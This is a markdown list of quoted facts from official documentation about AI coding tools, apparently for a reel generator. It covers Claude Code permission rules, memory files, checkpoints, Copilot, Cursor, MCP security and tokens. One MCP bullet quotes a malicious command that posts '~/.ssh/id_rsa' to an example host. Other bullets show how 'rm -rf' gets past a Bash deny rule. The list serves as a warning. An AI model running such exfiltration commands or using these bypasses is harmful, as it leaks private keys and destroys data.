# Verified facts about AI coding tools

The only facts the writer may use for a reel on the "ai_tool" side of the `topic` test (`generate.EXPERIMENTS`). Each
was read on its official page on 2026-10-19; re-check the page before relying on it, these docs change often. Add a
fact only with its official page, quoted as it says. Claims about a product are that product's own docs ("GitHub's
docs say ..."), never our opinion of it.

## Claude Code

- `.claudeignore` does nothing: "If your project has a `.claudeignore` file, it has no effect, so move its entries
  into `Read` deny rules", e.g. `Read(./.env)`. https://code.claude.com/docs/en/permissions
- Rule order: "Rules are evaluated in order: deny, then ask, then allow ... rule specificity doesn't change the
  order." "An allow rule can't carve an exception out of a deny rule": deny `Bash(aws *)` blocks `aws s3 ls` even
  with allow `Bash(aws s3 ls)`. https://code.claude.com/docs/en/permissions
- A Bash deny rule "isn't a security boundary around the program": `Bash(rm *)` stops `rm -rf build/` but not
  `/bin/rm -rf build/` or `bash -c 'rm -rf build/'`. https://code.claude.com/docs/en/permissions
- To block a file from Claude's file tools, add a `Read` deny rule for its path, such as `Read(./.env)` or
  `Read(./secrets/**)`. https://code.claude.com/docs/en/permissions
- CLAUDE.md is not enforced: "Claude treats them as context, not enforced configuration. To block an action
  regardless of what Claude decides, use a PreToolUse hook instead." https://code.claude.com/docs/en/memory
- CLAUDE.md size: "target under 200 lines per CLAUDE.md file. Longer files consume more context and reduce
  adherence." https://code.claude.com/docs/en/memory
- Claude Code "can also read a repository's `AGENTS.md` files in place of CLAUDE.md".
  https://code.claude.com/docs/en/memory
- Rewind does not undo shell commands: "Checkpointing does not track files modified by Bash commands" (`rm`, `mv`,
  `cp`): "These file modifications cannot be undone through rewind." Checkpoints are "not a replacement for version
  control". https://code.claude.com/docs/en/checkpointing
- Most subagent edits are not restored by rewind: "The subagent's edits to other files stay, so use git to revert
  them." https://code.claude.com/docs/en/checkpointing
- Skills: "skill descriptions are loaded into context so Claude knows what's available, but full skill content only
  loads when invoked." "Custom commands have been merged into skills." https://code.claude.com/docs/en/skills
- Subagents: "Each subagent runs in its own context window", "does that work in its own context and returns only
  the summary". https://code.claude.com/docs/en/sub-agents

## Other tools

- GitHub Copilot code review: "By default, Copilot's reviews do not count toward required approvals for the pull
  request." "Copilot is not guaranteed to spot all problems or issues in a pull request." It reads
  `.github/copilot-instructions.md`, `.github/instructions/*.instructions.md` and `AGENTS.md`, from the pull
  request's head branch. https://docs.github.com/en/copilot/concepts/agents/code-review
- Cursor: "Rules do not impact Cursor Tab or other AI features." Its best practices say "Keep rules under 500
  lines." https://cursor.com/docs/context/rules
- MCP security: a local MCP server is a program on your machine; the spec tells clients to "Warn that MCP servers
  run with the same privileges as the client" and shows malicious startup commands such as
  `npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location`.
  https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices

## How models behave

- Temperature 0 is not deterministic: "Even with temperature set to 0, the results will not be fully deterministic
  and identical inputs may produce different outputs across API calls." https://platform.claude.com/docs/en/about-claude/glossary
- Tokens "can correspond to words, subwords, characters, or even bytes"; on earlier Claude models "a token
  represents approximately 3.5 English characters", and Claude 4.7 and later produce about 30 percent more tokens
  for the same text. To get exact counts, use token counting. https://platform.claude.com/docs/en/about-claude/glossary
